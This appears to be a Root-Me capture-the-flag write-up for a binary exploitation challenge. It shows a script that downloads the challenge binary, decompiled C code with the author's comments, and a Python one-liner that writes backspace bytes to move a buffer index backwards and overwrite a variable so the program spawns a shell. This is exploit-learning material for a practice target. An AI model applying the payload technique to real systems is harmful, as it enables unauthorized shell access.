### S0lv3d by H4yicl3

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax@6
  int v4; // [sp+10h] [bp-50h]@1
  signed int v5; // [sp+14h] [bp-4Ch]@1
  int v6; // [sp+18h] [bp-48h]@4	 //The position of v6  esp+0x18
  int buf; // [sp+1Ch] [bp-44h]@17	 //The position of buf esp+0x1c
  int stackcookie; // [sp+5Ch] [bp-4h]@1

  stackcookie = *MK_FP(__GS__, 20);
  v4 = 0;
  v5 = 0;
  printf("Enter your name: ");
  fflush(stdout);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        if ( v5 > 63 )
          puts("Oh no...Sorry !");
        if ( v6 != 0xBFFFFABC )		//if v6==0xbffffabc we get shell
          break;
        shell();
      }
      v3 = fileno(stdin);
      read(v3, &v4, 1u);
      if ( v4 != 8 )			//if v5 == \x08
        break;				//we see the position of v6 and buf
is near !! wtf is that !! that mean stack cookie was on!!
					//so we need to redirect with buf[-4]to overflow 4 byte at v6 !! Great ided!!
      --v5;				//May be we need input "\x08" 4 times
      putchar(8);
    }
    if ( v4 > 8 )
    {
      if ( v4 == 0xA )
      {
        putchar(7);
      }
      else if ( v4 == 0x90 )
      {
        putchar(7);
        ++v5;
      }
      else
      {
LABEL_17:
        *((_BYTE *)&buf + v5++) = v4;
      }
    }
    else
    {
      if ( v4 != 4 )
        goto LABEL_17;
      putchar(9);
      ++v5;
    }
  }
}
```
See the source code with my comment at each line!!
overflow v6 become 0xbffffabc
So we have the python script look like!
```
 (python -c 'print "\x08"*4+"\xbc\xfa\xff\xbf"';cat)|./ch16
```

we controled the shell !! GLHF!! 

try it 
